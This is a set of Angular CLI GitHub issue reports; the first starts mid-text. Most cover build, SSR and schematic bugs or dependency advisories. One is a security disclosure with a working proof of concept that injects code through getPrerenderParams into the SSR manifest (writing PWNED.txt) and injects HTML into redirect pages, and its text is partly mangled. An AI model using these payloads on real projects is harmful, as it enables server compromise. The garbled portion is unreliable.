`@angular/platform-server/init` is a side-effectful module whose only job is `Object.assign(globalThis, domino.impl)` plus `globalThis.KeyboardEvent = domino.impl.Event`. The framework introduced it as something an app *may* import before bootstrap for code that touches DOM globals at module-evaluation time ([angular/angular#40559](https://github.com/angular/angular/pull/40559)). Most apps do not need it: `platform-server` runs the identical shim itself in `DominoAdapter.makeCurrent()` → `setDomTypes()` on every platform init, so for everything that runs after bootstrap the `init` patch is redundant and is overwritten on the first render anyway.

Since v15 the CLI adds it to every server build with no way to say no. Evidence that people need the opt-out:

- The framework's own SSR benchmarks patch `@angular/build` to strip the `platform-server/init` import from `polyfills.server.mjs` (`modules/ssr-benchmarks/README.md` in angular/angular), and the `main.server.ts` there notes that `ɵENABLE_DOM_EMULATION` "won't prevent the monkey patching of DOM apis as this is introduced by the CLI".
- Anyone running the server bundle outside Node with a real DOM (the benchmark case, or `ENABLE_DOM_EMULATION: false`) gets Domino's classes forced onto `globalThis` regardless.
- Apps that want to keep `globalThis` clean on the server (no `HTMLElement`, `Node`, `Event`, … leaking into third-party code that feature-detects the environment with `typeof window`/`typeof HTMLElement`) have no option either.

Measured on a default `ng new --ssr` app (details in #34514): the `init` module costs ~235 kB on disk, ~1.1 MB of retained heap for the life of the process and ~7 ms of startup, while the `Object.assign` itself is negligible (~7 KB, 0.03 ms). Prerendered and SSR output are byte-identical with and without it.

#### 2. There is nowhere to put a server-only polyfill

The `ssr.platform` option's own description says *"Please note that this feature does not provide polyfills for Node.js modules."* With `platform: 'neutral'` (Cloudflare Workers and similar), users are expected to bring polyfills themselves, yet the only polyfills option feeds the browser bundle. Today a server-only polyfill has to be imported manually at the top of `main.server.ts`, where it runs after `zone.js` and `init` and after any shared chunks.

### Describe the solution you'd like

Let `polyfills` take either the current array or a browser/server object, mirroring the existing `outputPath` shape (`string | { base, browser, server, media }`):

```jsonc
"polyfills": ["zone.js"]                                 // today, unchanged
"polyfills": {
  "browser": ["zone.js"],
  "server": ["zone.js/node", "@angular/platform-server/init"]
}
```

Semantics:

- **Array form keeps today's behaviour exactly**: `browser` = the array, `server` = derived as now (`zone.js/node`, localize, `init`). Non-breaking; no migration needed.
- **An explicit `server` list is the server polyfills list**, the same way the browser list already is: the builder adds nothing on top. To drop the `init` global patch, omit it. To keep today's output, list it. The `ng new` / `ssr` schematics can emit the explicit form so new projects see what they get.
- `isZonelessApp` is evaluated per list (browser list for the browser bundle, server list for the server bundle), so `zone.js` vs `zone.js/node` and the async/await support flags fall out naturally.
- `getEsBuildCommonPolyfillsOptions` and the `polyfills.server` bundle are unchanged; only the input list is. Normalization follows the existing `normalizeOptimization` / `normalizeSourceMaps` pattern (a small `normalizePolyfills` in `options.ts`, folding in the string-to-array shim that `browser-esbuild` still relies on).
- Consumers that read `options.polyfills` and would switch to `.browser` / `.server`: `application-code-bundle.ts` (browser bundle, server bundle, `isZonelessApp` checks), `execute-build.ts` (top-level-await hint), `dev-server/vite/index.ts` (`es2016` target), and `browser-esbuild`'s string handling.

This solves both gaps with one option and no new concept: server polyfills become as explicit as browser polyfills.

I am happy to implement this and open the PR once the shape is agreed; the single-copy fix in #34516 is independent of it and already covers the duplicate.

### Describe alternatives you've considered

**A boolean under `ssr`**, next to `ssr.platform`, which already shapes the server polyfill list (`zone.js` vs `zone.js/node`), the `createRequire` banner and the `xhr2` external:

```jsonc
"ssr": { "entry": "src/server.ts", "platform": "node", "domShims": false }
```

One `if` around line 184. It only addresses gap 1, and the name needs care so it is not confused with the framework's private `ɵENABLE_DOM_EMULATION`, which controls the adapter and does not affect the global shims.

**Leaving it manual**: users who want `init` could import it in `main.server.ts` as the v12 schematic did. That would be a breaking change for apps that rely on the implicit import, and it still leaves gap 2.

**Not an alternative, but related**: the same unconditional `init` import is also why the server build currently ships two copies of Domino (#34514). That has a bundling-level fix that does not need this option; this request is about control, not about the duplicate.

### Anything else relevant?

- No spec or e2e currently asserts anything about `polyfills.server.mjs`, `zone.js/node` or `@angular/platform-server/init`; `tests/options/polyfills_spec.ts` only covers `dist/browser/polyfills.js`. Either solution should add a server polyfills spec.
- The webpack server builder only adds `init` when `@angular/platform-server` is installed (`isPackageInstalled` in `webpack/configs/common.ts`); the esbuild path has no equivalent guard.
- Repro and measurements: https://github.com/ChristopherPHolder/ng-double-domino

title: Server build bundles two copies of Domino, so DOM globals from `init` and the `DominoAdapter` are different classes
body:
### Command

build

### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

Not a regression. The second copy appeared when the dedicated `polyfills.server` bundle was introduced in v17 and has been there since.

### Description

With `outputMode: 'server'` (the default `ng new --ssr` setup), `@angular/build:application` emits two complete copies of Domino into the server output, and both are evaluated in the same Node process:

| File | Brings in Domino via |
|---|---|
| `polyfills.server.mjs` | `@angular/platform-server/init`, pushed unconditionally in `createServerPolyfillBundleOptions` ([application-code-bundle.ts#L184](https://github.com/angular/angular-cli/blob/main/packages/angular/build/src/tools/esbuild/application-code-bundle.ts#L184)) |
| `main.server.mjs` | `@angular/platform-server` itself (`DominoAdapter`) |

The two bundles are separate esbuild contexts, so the `third_party/domino/bundled-domino.mjs` module that both entry points import is inlined into each output. `main.server.mjs` starts with `import './polyfills.server.mjs'`, so both copies load.

#### The two copies are different class hierarchies

`platform-server` runs the same shim as `init` in `DominoAdapter.makeCurrent()` → `setDomTypes()` during `PLATFORM_INITIALIZER`, using *its* copy. So on the first render every global that `init` set is overwritten by the second copy. Any code that captured a DOM class at module-evaluation time, which is exactly the scenario `init` exists to support, then holds a class from the other hierarchy:

```ts
// top of some module (e.g. a library doing `class Foo extends HTMLElement`)
const Captured = HTMLElement;                   // Domino copy #1, from polyfills.server.mjs

// later, during rendering
inject(DOCUMENT).body instanceof Captured;      // false  (body is from copy #2)
inject(DOCUMENT).body instanceof HTMLElement;   // true   (global was overwritten)
Captured === HTMLElement;                       // false
```

#### Measured cost of the second copy

Default `ng new --ssr` app, Angular CLI 22.2.4, `@angular/build` 22.2.4, `@angular/platform-server` 22.2.3, Node 26.8.1. "Without" is the same build with `@angular/platform-server/init` removed from the server polyfills and nothing else changed. Memory is the median over 11 fresh processes per variant, forced GC before each snapshot, after serving 50 SSR requests.

| | With `init` (default) | Without | Cost of the extra copy |
|---|---|---|---|
| `polyfills.server.mjs` on disk | 235.58 kB | 128 B | **235 kB** |
| Retained V8 heap after loading `main.server.mjs` | 3,875 KB | 2,739 KB | **~1.1 MB** |
| Retained V8 heap after 50 requests | 12,477 KB | 11,342 KB | **~1.1 MB** (does not grow) |
| Import time of `polyfills.server.mjs` | ~7.5 ms | ~0.6 ms | **~7 ms** startup |
| Prerendered / SSR HTML | identical | identical | — |

The 1.1 MB is permanent: the ESM module namespace keeps every Domino function and prototype reachable for the lifetime of the process. From a heap-snapshot diff it is roughly 350 KB compiled code and function metadata, 340 KB retained source strings, 200 KB prototype and lookup tables, 110 KB function objects, and V8 internals for the rest. The `Object.assign(globalThis, domino.impl)` itself is negligible (95 properties, ~7 KB, 0.03 ms); the cost is the second module evaluation.

To be clear about scale: in a fresh default app the duplicate is about 30% of the retained heap after loading the server bundles and about 2% of process RSS once requests are served. Small in absolute terms, but pure overhead on every SSR deployment, and the `instanceof` inconsistency above comes with it.

### Minimal Reproduction

```bash
npx @angular/cli@22.2.4 new repro --ssr --defaults
cd repro
npx ng build --configuration development   # keeps esbuild's module markers
grep -n "^// node_modules/@angular/platform-server" dist/repro/server/*.mjs
```

Actual:

```
main.server.mjs:36143:// node_modules/@angular/platform-server/third_party/domino/bundled-domino.mjs
main.server.mjs:52859:// node_modules/@angular/platform-server/fesm2022/_server-chunk.mjs
main.server.mjs:53402:// node_modules/@angular/platform-server/fesm2022/platform-server.mjs
polyfills.server.mjs:4:// node_modules/@angular/platform-server/third_party/domino/bundled-domino.mjs
polyfills.server.mjs:16720:// node_modules/@angular/platform-server/fesm2022/init.mjs
```

Expected: `bundled-domino.mjs` appears once across the server output.

Full repro with the memory-measurement harness and the `instanceof` probe: https://github.com/ChristopherPHolder/ng-double-domino

### Exception or Error

```
(none; the build succeeds)
```

### Your Environment

```
Angular CLI       : 22.2.4
Node.js           : 26.8.1
Package Manager   : npm 11.19.0

@angular/build            22.2.4
@angular/core             22.2.3
@angular/platform-server  22.2.3
@angular/ssr              22.2.4
```

### Anything else relevant?

#### Proposed fix (no API change), PR to follow

The polyfills bundle has to stay a separate, externally imported file: it is the only thing that guarantees `zone.js` and `init` evaluate before application code. (With code splitting, a side-effect import at the top of the `main.server` entry is inlined into the entry file while shared chunks are hoisted above it, so moving the `init` import there runs it *after* shared app chunks.) So the fix shares the copy rather than moving it:

- `polyfills.server.mjs` additionally re-exports the Domino module it already bundles via `init`.
- The main server bundle redirects `@angular/platform-server`'s `../third_party/domino/bundled-domino.mjs` import to that export. `./polyfills.server.mjs` is already in `SERVER_GENERATED_EXTERNALS`, so this becomes a plain external import.

Verified on the repro above with the patched builder:

| | Before | After |
|---|---|---|
| `bundled-domino.mjs` in `main.server.mjs` | yes | no |
| `main.server.mjs` (production) | 537 kB | 301 kB |
| Retained heap after loading `main.server.mjs` | 3,875 KB | 2,831 KB |
| `body instanceof capturedHTMLElement` / `captured === HTMLElement` | false / false | true / true |
| SSR response | 200, 22,064 B | 200, 22,064 B |

It covers `outputMode: 'server'`, the legacy `ssr` + `prerender` path (same esbuild context, same banner), `platform: 'neutral'`, prerendering, and the dev server when bundling. When packages are external (`ng serve` prebundling) nothing changes, and Node's module cache already shares one copy there. The change comes with a spec under `builders/application/tests/behavior/`; today no spec or e2e asserts anything about `polyfills.server.mjs`.

#### Related

This fix keeps `@angular/platform-server/init` in every server build. Whether it should be there at all, and the lack of any user control over the server polyfills list, is a separate request: #34515.

<details>
<summary>How the duplicate came about</summary>

- **angular/angular#40559 (v12, 2021)** — `@angular/platform-server/init` created so DOM globals are available *before* platform init.
- **angular-cli `1199205bc` (v12)** — `universal` schematic adds the import to `main.server.ts`.
- **angular-cli `979bce45e` (v15)** — webpack server builder auto-adds it, removing the schematic import. `f143171fd` gates it on `@angular/platform-server` being installed (#24188).
- **angular-cli `095f5aba6` / `7defb3635` (v16)** — esbuild server bundling imports it in the virtual `main.server` entry; one copy.
- **angular-cli `886cb3167` (v17)** — a separate `polyfills.server` bundle is created to control zone.js flag ordering for cleaner stack traces. `init` moves into it with the other server polyfills. This is where the second copy starts; the commit is about zone.js and does not mention it.
- **angular/angular#52342 (v17)** — the shared `setDomTypes` import between `init` and `platform-server` is removed so the CLI can skip the JS transformer on the polyfills bundle (angular-cli#26113). After this the two entry points share no module, which guarantees two copies when bundled separately.

So the duplicate was never a deliberate choice; it fell out of two independent build-performance changes.

</details>

title: ssr: string redirectTo drops trailing slash in query and fragment
body:
### Command

build, serve

### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

none, same baseHref join is there since 19.0.0

### Description

String `redirectTo` loses trailing `/` of query or fragment in `Location`: `'/login?next=/a/'` gives `/login?next=/a` and `'/login#section/'` gives `/login#section`. Same with `X-Forwarded-Prefix` and with base href `/base/`, on 22.2.4 and on main snapshot `22.3.0-next.3+sha-928169a`

Function redirect with same target keeps it (`/login?next=%2Fa%2F` and `/login#section/`) since router serializes it, so same target gives diffrent `Location` depending only on how redirect is written

### Minimal Reproduction

1. `npx -p @angular/cli@latest ng new repro --ssr --defaults --skip-git`
2. `src/app/app.routes.ts`:

```ts
import { Component } from '@angular/core';
import { Routes } from '@angular/router';

@Component({ template: 'login' })
class Login {}

export const routes: Routes = [
  { path: 'login', component: Login },
  { path: 'old', redirectTo: '/login?next=/a/' },
  { path: 'old-hash', redirectTo: '/login#section/' },
  { path: 'old-fn', redirectTo: () => '/login?next=/a/' },
  { path: 'old-fn-hash', redirectTo: () => '/login#section/' },
];
```

3. `src/app/app.routes.server.ts`: `[{ path: '**', renderMode: RenderMode.Server }]` so function redirects go through render
4. `ng build` then `NG_ALLOWED_HOSTS=localhost NG_TRUST_PROXY_HEADERS=x-forwarded-prefix node dist/repro/server/server.mjs`
5. curl:

```text
$ curl -si localhost:4000/old | grep -i '^location'
location: /login?next=/a
$ curl -si localhost:4000/old-hash | grep -i '^location'
location: /login#section
$ curl -si localhost:4000/old-fn | grep -i '^location'
location: /login?next=%2Fa%2F
$ curl -si localhost:4000/old-fn-hash | grep -i '^location'
location: /login#section/
$ curl -si -H 'X-Forwarded-Prefix: /app' localhost:4000/old | grep -i '^location'
location: /app/login?next=/a
$ curl -si -H 'X-Forwarded-Prefix: /app' localhost:4000/old-hash | grep -i '^location'
location: /app/login#section
```

With `ng build --base-href /base/` it's `/base/login?next=/a` and `/base/login#section`. Slash is gone already at build time, `dist/repro/server/angular-app-manifest.mjs` has `"redirectTo": "/login?next=/a"`

Expected: `/login?next=/a/` and `/login#section/`, with `/app` or `/base` in front when set

Actual: trailing slash of query and fragment is gone

### Exception or Error

```text
none, only Location header is wrong
```

### Your Environment

```text
Angular CLI       : 22.2.4
Angular           : 22.2.3
Node.js           : 24.16.0
Package Manager   : npm 11.13.0
Operating System  : darwin arm64

┌───────────────────────────┬───────────────────┬───────────────────┐
│ Package                   │ Installed Version │ Requested Version │
├───────────────────────────┼───────────────────┼───────────────────┤
│ @angular/build            │ 22.2.4            │ ^22.2.4           │
│ @angular/cli              │ 22.2.4            │ ^22.2.4           │
│ @angular/common           │ 22.2.3            │ ^22.2.0           │
│ @angular/compiler         │ 22.2.3            │ ^22.2.0           │
│ @angular/compiler-cli     │ 22.2.3            │ ^22.2.0           │
│ @angular/core             │ 22.2.3            │ ^22.2.0           │
│ @angular/forms            │ 22.2.3            │ ^22.2.0           │
│ @angular/platform-browser │ 22.2.3            │ ^22.2.0           │
│ @angular/platform-server  │ 22.2.3            │ ^22.2.0           │
│ @angular/router           │ 22.2.3            │ ^22.2.0           │
│ @angular/ssr              │ 22.2.4            │ ^22.2.4           │
│ rxjs                      │ 7.8.2             │ ~7.8.0            │
│ typescript                │ 6.0.3             │ ~6.0.2            │
│ vitest                    │ 5.0.5             │ ^5.0.0            │
└───────────────────────────┴───────────────────┴───────────────────┘

same output with @angular/ssr 22.3.0-next.3+sha-928169a from angular-ssr-builds
```

### Anything else relevant?

`joinUrlParts` trims trailing `/` of every part, and two places still pass it whole target with query and fragment: [`joinUrlParts(baseHref, metadata.redirectTo)`](https://github.com/angular/angular-cli/blob/928169a68b522b8f38334ee2626687704495e5ec/packages/angular/ssr/src/routes/ng-routes.ts#L900) in `extractRoutesAndCreateRouteTree` and [prefix join](https://github.com/angular/angular-cli/blob/928169a68b522b8f38334ee2626687704495e5ec/packages/angular/ssr/src/app.ts#L170-L173) in `AngularServerApp.handle`

[#34467](https://github.com/angular/angular-cli/pull/34467) description says `joinUrlParts` is applied only to path portion when prepending `baseHref` or `X-Forwarded-Prefix` so trailing slashes in query or fragment are preserved, but both joins above still take whole target. If that's not intended I can send PR that splits off query and fragment first, like `resolveRedirectTo` does

title: 22.3.0-next build library change input entries source and output structure
body:
### Command

build

### Description

This is meant as early feedback for 22.3.0-next to improve the interface before the final version is release as this is be a breaking change to the existing solution.

#### input entries source
The current implementation requires developers to add the entry points to package.json exports field.
If the package should now be publish the export will point to the .ts files instead of the actual compiled ones.

There are workaround for this for example
```yaml
# deploy the dist folder of the angular wrapper that was created by ng-packgr
# npm no longer respects publishConfig.directory => physically replace the original folder with the built dist folder.

script:
    - mv packages/angular-library/dist /tmp/ng-dist
    - rm -rf packages/angular-library
    - mkdir -p packages/angular-library
    - cp -a /tmp/ng-dist/. packages/angular-library
```

#### output structure
currently the output structure is similar to ng-packagr:

- dist
  - fesm2022
    - my-component.mjs
  - my-component
    - package.json
  - .npmignore
  - package.json

this is quite verbose and uses multiple package.json which are only used for development

the tsconfig will also need to be altered to point to the correct path:

```json
{
  "compilerOptions": {
    "paths": {
      "angular-library/*": ["../angular-library/dist/*"]
    }
  }
}
```

### Describe the solution you'd like

#### input entries source

instead of polluting the package.json an `exports` option could be added to angular.json build target instead.

```json
{
  "$schema": "./node_modules/@angular/cli/lib/config/schema.json",
  "version": 1,
  "projects": {
    "angular-library": {
      "projectType": "library",
      "root": ".",
      "sourceRoot": "src",
      "architect": {
        "build": {
          "builder": "@angular/build:library",
          "options": {
            "exports": {
               ".": "src/barrel-file.ts",
               "./my-component": "src/lib/my-component.ts"
             }
          }
        }
      }
    }
  }
}
```

#### output structure

instead of writing multiple package.json the entry points can be directly written to the package.json exports field. This will result in a flat dist folder layout and no more need to configure tsconfig.

- dist
  - my-component.mjs

### Describe alternatives you've considered

_No response_

title: Angular SSR Unescaped prerender parameters enable RCE through generated manifests and XSS in redirect pages
body:
### Command build ### Is this a regression? - [ ] Yes, this behavior used to work in the previous version ### The previous version in which this bug was not present was _No response_ ### Description `ng build` writes the values returned by `getPrerenderParams()` into two generated files without escaping them: - the server manifest (`angular-app-manifest.mjs`), executable ESM that the SSR server imports; - the static redirect pages generated when prerendering. Those values are documented as application data, usually read from a service: ```ts const ids = await dataService.getIds(); return ids.map((id) => ({ id })); ``` So whoever controls that data, such as a CMS entry or a shared or compromised API, controls code and HTML that the build ships. One value is enough: | Value returned by `getPrerenderParams()` | Result | | ------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ | | ``x'(){},[(function(){…})()](){},[`](){('`` | Runs arbitrary code in the SSR server when the manifest is imported, on the first request of any kind. | | `x"> 
Redirecting to ${url}
``` For a relative `redirectTo` under a parameterized parent, `ng-routes.ts` substitutes the value into`url`, so the markup reaches all three positions. In a template, `{{ slug }}` escapes the very same value correctly. ### Minimal Reproduction Repository: https://github.com/SkyZeroZx/angular-cli-prerender-param-injection-poc. There the values arrive over HTTP from the application's own API. **1. Code execution through the manifest** (`outputMode: 'server'`) ```ts // app.routes.ts export const routes: Routes = [{ path: 'product/:slug', component: App }]; // app.routes.server.ts export const serverRoutes: ServerRoute[] = [ { path: 'product/:slug', renderMode: RenderMode.Prerender, getPrerenderParams: async () => [ { slug: "x'(){},[(function(){import('fs').then(function(f){f.writeFileSync('PWNED.txt','rce')})})()](){},[`](){('", }, ], }, { path: '**', renderMode: RenderMode.Prerender }, ]; ``` ```bash ng build node --check dist/repro-app/server/angular-app-manifest.mjs node dist/repro-app/server/server.mjs & curl -s -o /dev/null -w '%{http_code}\n' http://localhost:4000/ ls PWNED.txt ``` ```text Prerendered 1 static route. Application bundle generation complete. 404 PWNED.txt ``` With `slug: "customer's-choice"` instead, the build is still green and every request returns 500. **2. HTML injection in the redirect page** (`outputMode: 'static'`) ```ts // app.routes.ts export const routes: Routes = [ { path: 'go/:slug', children: [ { path: 'r', redirectTo: 'target' }, { path: 'target', component: App }, ], }, ]; // app.routes.server.ts export const serverRoutes: ServerRoute[] = [ { path: 'go/:slug', renderMode: RenderMode.Prerender, getPrerenderParams: async () => [{ slug: 'x">
Redirecting to
``` On Windows, `"`, `<` and `>` are not valid in a file name. With a parent that only redirects, such as `{ path: 'go/:slug', children: [{ path: '', redirectTo: 'claimed', pathMatch: 'full' }] }`, appending `/../../safe` to the value keeps the markup out of the file name but in the page. `posix.join()` collapses the dot segments for the output path, while `joinUrlParts()` keeps them in the target, so the page lands at `go/safe/index.html` and is served at `/go/safe/`. ### Your Environment ```text Angular CLI 22.2.3 @angular/build 22.2.3 @angular/ssr 22.2.3 Node.js 24.16.0 npm 11.13.0 Windows 11 x64 WSL Ubuntu ``` ### Anything else relevant? _No response_

title: @angular/cli 21.2.x and 20.3.x depend on @modelcontextprotocol/sdk@1.31.0 which is vulnerable to CVE-2026-111767, CVE-2026-111768, CVE-2026-111769 and CVE-2026-111771
body:
### Command

other

### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

_No response_

### Description

`@modelcontextprotocol/sdk` versions before `1.32.0` are affected by four advisories published on 2026-10-20, all patched in `1.32.0`:

- https://github.com/advisories/GHSA-22jm-h49p-29qw (CVE-2026-111767, CVSS 8.6): "MCP TypeScript SDK: Experimental tasks were not tied to the session that created them", affected `>= 1.24.0, < 1.32.0`
- https://github.com/advisories/GHSA-46jr-4wx8-v453 (CVE-2026-111768, CVSS 7.5): "MCP TypeScript SDK: One HTTP request within the default size limit could exhaust server memory during validation", affected `>= 1.3.0, < 1.32.0`
- https://github.com/advisories/GHSA-6prh-2h8m-c8cw (CVE-2026-111769, CVSS 6.5): "MCP TypeScript client SDK: HTTP client transports and OAuth requests followed cross-origin redirects and re-sent custom headers and request bodies", affected `< 1.32.0`
- https://github.com/advisories/GHSA-rvq5-wwqv-78pq (CVE-2026-111771, CVSS 6.8): "MCP TypeScript SDK: Server bearer authentication accepted tokens issued for another service", affected `>= 1.6.0, < 1.32.0`

Both LTS branches pin a vulnerable version exactly (locked on, no update allowed):

- v21 LTS: `@angular/cli` 21.2.26 through 21.2.27 (latest) depend on `@modelcontextprotocol/sdk@1.31.0` (earlier 21.2.x pinned 1.26.0 and 1.30.0, also affected)
- v20 LTS: `@angular/cli` 20.3.39 through 20.3.40 (latest) depend on `@modelcontextprotocol/sdk@1.31.0` (earlier 20.3.x pinned 1.17.3, 1.24.0, 1.25.2, 1.26.0 and 1.30.0, also affected)

v22 (22.2.x) is not affected: it depends on `@modelcontextprotocol/server` instead, pinned to the patched `2.3.1` since 22.2.2 (22.2.0 and 22.2.1 pinned `2.0.0`, updated in #34266).

The CLI only uses `McpServer` over stdio, so these do not look reachable through `ng mcp`, but the exact pin makes `npm audit` flag every install. npm's advisory feed only has GHSA-22jm-h49p-29qw and GHSA-6prh-2h8m-c8cw so far, so the audit output below lists those two.

The fix would be bumping `@modelcontextprotocol/sdk` to `1.32.1` (latest, same code as `1.32.0`) on both branches, as was done for #34263 (#34264 / #34265).

### Minimal Reproduction

1. npm install @angular/cli@21 (or @angular/cli@20)
2. npm audit

### Exception or Error

```text
# npm audit report

@modelcontextprotocol/sdk  <=1.31.0
Severity: high
MCP TypeScript SDK: Experimental tasks were not tied to the session that created them - https://github.com/advisories/GHSA-22jm-h49p-29qw
MCP TypeScript client SDK: HTTP client transports and OAuth requests followed cross-origin redirects and re-sent custom headers and request bodies - https://github.com/advisories/GHSA-6prh-2h8m-c8cw
fix available via `npm audit fix --force`
Will install @angular/cli@22.2.3, which is a breaking change
node_modules/@modelcontextprotocol/sdk
  @angular/cli  20.3.13 - 20.3.40 || 21.0.2 - 22.2.0-rc.0
  Depends on vulnerable versions of @modelcontextprotocol/sdk
  node_modules/@angular/cli
```

### Your Environment

```text
Angular CLI       : 21.2.27 / 20.3.40
Package Manager   : npm
```

### Anything else relevant?

_No response_

title: @angular/build 22.2.x, 21.2.x and 20.3.x depend on vite@8.3.0 / vite@7.3.6 which are vulnerable to CVE-2026-112943
body:
### Command

serve

### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

_No response_

### Description

See https://github.com/advisories/GHSA-698v-4r3x-3vcv (CVE-2026-112943, CVSS v4 6.3): "launch-editor: escapeCmdArgs() omits % escaping on Windows". vite bundles `launch-editor` into its dist, so the fix only ships with a vite bump.

Affected ranges relevant here: `vite >= 8.3.0, <= 8.3.2` (patched in `8.3.3`) and `vite >= 7.0.0, <= 7.3.6` (patched in `7.3.7`).

`@angular/build` pins a vulnerable version exactly on the active and both LTS branches:

- v22: `@angular/build` 22.2.0 through 22.2.3 (latest) depend on `vite@8.3.0`
- v21 LTS: `@angular/build` 21.2.18 through 21.2.27 (latest) depend on `vite@7.3.6` (earlier 21.2.x pinned 7.3.1 to 7.3.5, also affected)
- v20 LTS: `@angular/build` 20.3.31 through 20.3.40 (latest) depend on `vite@7.3.6` (earlier 20.3.x pinned 7.1.2 to 7.3.5, also affected)

`ng serve` keeps vite's `/__open-in-editor` middleware, so the dev server on Windows is affected. `main` is already fixed (`vite@8.3.4` in 22.3.0-next.2).

The fix would be:

- 22.2.x: approving the pending Renovate updates "build: update dependency vite to v8.3.4 (22.2.x)" and "build: update dependency rolldown to v1.2.14 (22.2.x)" on the Dependency Dashboard (#23493), since vite 8.3.4 requires `rolldown ~1.2.12` while 22.2.x pins `1.2.8`
- 21.2.x and 20.3.x: bumping `vite` to `7.3.7`, as was done for #33407 (#33408 / #33409)

### Minimal Reproduction

1. npm view @angular/build@latest version dependencies.vite
2. npm view @angular/build@v21-lts version dependencies.vite
3. npm view @angular/build@v20-lts version dependencies.vite

### Exception or Error

```text
$ npm view @angular/build@latest version dependencies.vite
version = '22.2.3'
dependencies.vite = '8.3.0'
$ npm view @angular/build@v21-lts version dependencies.vite
version = '21.2.27'
dependencies.vite = '7.3.6'
$ npm view @angular/build@v20-lts version dependencies.vite
version = '20.3.40'
dependencies.vite = '7.3.6'
```

### Your Environment

```text
@angular/build    : 22.2.3 / 21.2.27 / 20.3.40
Package Manager   : npm
```

title: `ng generate app-shell` and `ng generate module --route` produce broken imports when a component `type` is configured
body:
### Command

generate

### Is this a regression?

- [x] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

19.x (before the v20 file naming change)

### Description

`ng generate app-shell` and `ng generate module <name> --route <path> --module <parent>` generate a component and then
reference it with a hard-coded file path and class name. Both assume the v20+ defaults (no type in the file or class
name). When the workspace configures a component `type`, the component inherits it and the hard-coded references no
longer match, so the build fails.

Workspaces get a component `type` in two common ways:

1. Every workspace updated to v20 with `ng update`: the migration that keeps the previous style guide behaviour
   (fdc6291dda) adds `"@schematics/angular:component": { "type": "component" }`.
2. `ng new --file-name-style-guide=2016`, which adds `{ "type": "component", "addTypeToClassName": false }`.

Hard-coded references:

- `packages/schematics/angular/app-shell/index.ts`: `withAppShell(AppShell)` and
  `insertImport(..., 'AppShell', './app-shell/app-shell')`.
- `packages/schematics/angular/module/files/.../__name@dasherize__-routing__typeSeparator__module.ts.template` (and the
  non-routing module template for `--route` without a routing module): `import { <%= classify(name) %> } from './<%= dasherize(name) %>';`

The library schematic had the same problem (#26981) and was fixed in 661609e3e by passing an explicit `type: ''` to the
component schematic.

### Minimal Reproduction

**app-shell** (updated-workspace configuration):

```sh
ng new ws --defaults
cd ws
# what `ng update` to v20 adds to angular.json under projects.ws.schematics:
#   "@schematics/angular:component": { "type": "component" }
ng generate app-shell
ng build
```

Generated `src/app/app-shell/app-shell.component.ts` contains `export class AppShellComponent {}`, but
`src/app/app.config.server.ts` contains:

```ts
import { AppShell } from './app-shell/app-shell';
...
provideServerRendering(withRoutes(serverRoutes), withAppShell(AppShell))
```

**module --route** (2016 file name style):

```sh
ng new ws --no-standalone --file-name-style-guide=2016 --defaults
cd ws
ng generate module feature --route feature --module app
ng build
```

Generated `src/app/feature/feature-routing.module.ts`:

```ts
import { Feature } from './feature'; // the file is feature.component.ts
```

### Exception or Error

```text
# app-shell
✘ [ERROR] TS2307: Cannot find module './app-shell/app-shell' or its corresponding type declarations. [plugin angular-compiler]
✘ [ERROR] Could not resolve "./app-shell/app-shell"

# module --route
✘ [ERROR] Could not resolve "./feature"
✘ [ERROR] TS2307: Cannot find module './feature' or its corresponding type declarations. [plugin angular-compiler]
```

### Your Environment

```text
Angular CLI       : 22.2.3
Node.js           : 24.15.0
Package Manager   : npm 11.12.1
Operating System  : darwin arm64
@schematics/angular : 22.2.3
```

### Anything else relevant?

- Affected since 20.0.0 (hard-coded names from 23fc8e1e17, "generate components without a `.component`
  extension/type"). Same code on `21.2.x` and `22.2.x`.
- Suggested fix: follow 661609e3e and pass `type: ''` (and `addTypeToClassName: false`, so the class name stays
  `AppShell`/`Feature`) to the component schematic in `app-shell` and `module`, so the generated files always match
  the references. Happy to send a PR.
- The `module --route` case with `addTypeToClassName: false` also hits #<issue for 01> (wrong NgModule declaration);
  link the two once filed.

title: `ng generate component/directive --module` declares a class that doesn't exist when `addTypeToClassName` is `false`
body:
### Command

generate

### Is this a regression?

- [x] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

The `addTypeToClassName` option was added in 21.0.0, and the declaration code was not updated, so it never worked.

### Description

When a component or directive is generated into an NgModule with `addTypeToClassName: false` and a `type` set, the
generated class and the symbol added to the NgModule don't match:

- The component/directive class is named without the type (e.g. `Widget`), as configured.
- The NgModule `declarations` (and `exports` with `--export`) import the name **with** the type
  (e.g. `WidgetComponent`), so the build fails.

This is the configuration that `ng new --no-standalone --file-name-style-guide=2016` writes to `angular.json`:

```json
"@schematics/angular:component": { "type": "component", "addTypeToClassName": false },
"@schematics/angular:directive": { "type": "directive", "addTypeToClassName": false }
```

The component and directive schematics compute the class name with `addTypeToClassName`
(`packages/schematics/angular/component/index.ts`, `packages/schematics/angular/directive/index.ts`), but the shared
`addDeclarationToNgModule` helper always appends the type:

```ts
// packages/schematics/angular/utility/add-declaration-to-ng-module.ts
const classifiedName =
  strings.classify(options.name) + (options.type ? strings.classify(options.type) : '');
```


### Minimal Reproduction

```sh
ng new ws --no-standalone --file-name-style-guide=2016 --defaults
cd ws
ng generate component widget --module app
ng build
```


Generated `src/app/widget/widget.component.ts`:

```ts
export class Widget {}
```

Updated `src/app/app.module.ts`:

```ts
import { WidgetComponent } from './widget/widget.component';

@NgModule({
  declarations: [App, WidgetComponent],
```

The same happens for `ng generate directive ... --module`.


### Exception or Error

```text
✘ [ERROR] TS2305: Module '"./widget/widget.component"' has no exported member 'WidgetComponent'. [plugin angular-compiler]
✘ [ERROR] NG1010: Value at position 1 in the NgModule.declarations of AppModule is not a reference
```

### Your Environment

```text
Angular CLI       : 22.2.3
Node.js           : 24.15.0
Package Manager   : npm 11.12.1
Operating System  : darwin arm64
@schematics/angular : 22.2.3
```

### Anything else relevant?

- Introduced together with `addTypeToClassName` in e417c89f9e (#31053, v21.0.0). The same code is on `21.2.x` and `22.2.x`.
- Suggested fix: let `addDeclarationToNgModule` use the class name computed by the calling schematic (or honour
